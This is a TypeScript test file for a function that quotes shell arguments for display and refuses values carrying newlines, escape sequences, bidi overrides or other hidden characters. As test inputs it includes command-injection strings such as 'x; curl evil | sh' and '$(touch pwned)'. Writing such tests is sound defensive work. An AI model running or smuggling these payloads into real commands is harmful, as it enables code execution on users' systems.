import { execFileSync } from 'node:child_process';

import { describe, expect, it } from 'vitest';

import { shellArgumentForDisplay } from './shell-argument.js';

describe('shellArgumentForDisplay', () => {
  it('shows a plain token as it is', () => {
    expect(shellArgumentForDisplay('files')).toBe('files');
    expect(shellArgumentForDisplay('my-server_2.v1')).toBe('my-server_2.v1');
  });

  it.each(['x; curl evil | sh', 'x$(touch pwned)', 'x`touch pwned`', "it's", 'a b', '-rf *'])(
    'single-quotes %j so a shell reads it back as one argument',
    (value) => {
      const shown = shellArgumentForDisplay(value)!;
      expect(shown.startsWith("'")).toBe(true);
      if (process.platform !== 'win32') {
        const echoed = execFileSync('/bin/sh', ['-c', `printf '%s' ${shown}`], {
          encoding: 'utf8',
        });
        expect(echoed).toBe(value);
      }
    },
  );

  it.each([
    ['a newline', 'x\nrobota mcp login good'],
    ['an escape sequence', 'x\u001b[2Kgood'],
    ['a right-to-left override', 'x‮good'],
    ['a carriage return', 'x\rgood'],
    ['DEL', 'x\u007f'],
    ['a zero-width space', 'x​good'],
    ['nothing', ''],
  ])('refuses to show %s', (_name, value) => {
    expect(shellArgumentForDisplay(value)).toBeUndefined();
  });
});
